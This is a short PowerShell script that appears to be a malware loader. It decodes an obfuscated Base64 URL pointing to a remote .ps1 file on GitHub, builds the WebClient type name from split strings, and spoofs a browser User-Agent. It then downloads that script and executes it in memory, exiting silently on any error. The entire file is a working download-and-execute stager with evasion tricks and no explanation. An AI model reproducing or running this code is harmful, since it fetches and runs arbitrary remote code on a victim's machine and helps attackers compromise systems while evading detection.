$v = 1
if ($v -eq 1) {
    try {
        $u = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AagBrAHQAdgB6AC8ASgAvAG0AYQBpAG4ALwBhAC4AcABzADEA'))
                $t = "Net.Web" + "Client"
        $o = New-Object $t
        $o.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        
        $b = $o."DownloadData"($u)
        $c = [System.Text.Encoding]::UTF8.GetString($b)
        $ExecutionContext.InvokeCommand.InvokeScript($c)
    } catch { exit }
}
